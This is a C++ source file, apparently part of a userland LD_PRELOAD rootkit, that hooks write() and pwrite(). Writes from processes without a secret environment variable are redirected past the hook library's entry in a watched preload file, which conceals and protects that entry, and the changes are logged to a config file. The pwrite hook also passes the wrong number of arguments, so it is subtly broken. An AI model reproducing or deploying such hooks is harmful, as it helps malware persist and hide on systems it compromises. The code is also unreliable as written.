
#include "main.h"



ssize_t write (int fd, void *buf, size_t count) {
	CErrnoSaver serr;
	std::string lnkAim;
	WRITE wrPtr = (WRITE)dlsym (RTLD_NEXT, "write");
	LSEEK lskPtr = (LSEEK)dlsym (RTLD_NEXT, "lseek");
	PWRITE pwrPtr = (PWRITE)dlsym (RTLD_NEXT, "pwrite");
	OPEN opnPtr = (OPEN)dlsym (RTLD_NEXT, "open");
	char *chPtr;
	ssize_t ret;
	

	assert (opnPtr != NULL);
	assert (wrPtr != NULL);
	assert (lskPtr != NULL);
	assert (pwrPtr != NULL);

	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
		if ((ret = wrPtr (fd, buf, count)) == -1) {
			serr.set (errno);
		}
		return ret;
	}
	
	lnkAim = readLinkName (("/proc/self/fd/" + intToString (fd)).c_str ());
	
	if (lnkAim == prelFileName) {
		if (-1 == lskPtr (fd, SEEK_CUR, (hookLibraryName + separator).size ())) {
			serr.set (EBADF);
			return -1;
		}
		
		// everything is OK, to write to our dynamic_cnf.txt
		descr_holder fd_t (new int (-1));
		if ((*fd_t = opnPtr (dynCnfFile.c_str (), O_RDWR)) == -1) {
			serr.set (EBADF);
			return -1;
		}
		lockAllFile (*fd_t);
		
		if ((ret = wrPtr (fd, buf, count)) == -1) {
			serr.set (errno);
			return -1;
		}
		while (pwrPtr (*fd_t,
					   (std::string (created) + writed).c_str (),
					   (std::string (created) + writed).size (),
					   0
			  ) == -1 && errno == EINTR
		);
		
		return ret;
	}
	
	
	if ((ret = wrPtr (fd, buf, count)) == -1) {
		serr.set (errno);
	}
	return ret;
}

ssize_t pwrite (int fd, const void *buf, size_t count, off_t offset) {
	std::string lnkAim;
	CErrnoSaver serr;
	PWRITE pwrPtr = (PWRITE)dlsym (RTLD_NEXT, "pwrite");
	OPEN opnPtr = (OPEN)dlsym (RTLD_NEXT, "open");
	char *chPtr;
	ssize_t ret;
	

	assert (opnPtr != NULL);
	assert (pwrPtr != NULL);

	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
		if ((ret = pwrPtr (fd, buf, count, offset)) == -1) {
			serr.set (errno);
		}
		return ret;
	}
	
	lnkAim = readLinkName (("/proc/self/fd/" + intToString (fd)).c_str ());
	
	if (lnkAim == prelFileName) {
		descr_holder fd_t (new int (-1));
		if ((*fd_t = opnPtr (dynCnfFile.c_str (), O_RDWR)) == -1) {
			serr.set (EBADF);
			return -1;
		}
		lockAllFile (*fd_t);
		
		if ((ret = pwrPtr (fd, buf, offset + (hookLibraryName + separator).size ())) == -1) {
			serr.set (errno);
			return -1;
		}
		while (pwrPtr (*fd_t,
					   (std::string (created) + writed).c_str (),
					   (std::string (created) + writed).size (),
					   0
			  ) == -1 && errno == EINTR
		);
		
		return ret;
	}
	
	
	if ((ret = pwrPtr (fd, buf, count, offset)) == -1) {
		serr.set (errno);
	}
	return ret;
}








